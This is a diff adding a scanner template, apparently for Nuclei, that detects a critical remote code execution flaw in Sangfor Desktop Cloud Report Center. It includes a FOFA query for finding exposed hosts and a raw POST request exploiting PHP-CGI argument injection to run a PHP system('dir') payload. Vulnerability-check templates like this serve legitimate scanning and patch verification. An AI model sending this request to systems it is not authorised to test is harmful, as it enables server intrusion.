@@ -1,0 +1,28 @@
+id: sangfor-desktop-cloud-rce
+
+info:
+  name: Sangfor Desktop Cloud Report Center RCE
+  author: Co5mos
+  severity: critical
+  description: |
+    Sangfor Desktop Cloud Report Center has a remote code execution vulnerability that allows attackers to execute arbitrary code on the server.
+  metadata:
+    fofa-query: 'app="深信服-桌面云"'
+  tags: sangfor, rce
+
+http:
+  - raw:
+      - |
+        POST /dphp/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        REDIRECT-STATUS:1
+
+        <?php system("dir")?>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, '<DIR>')
+        condition: and
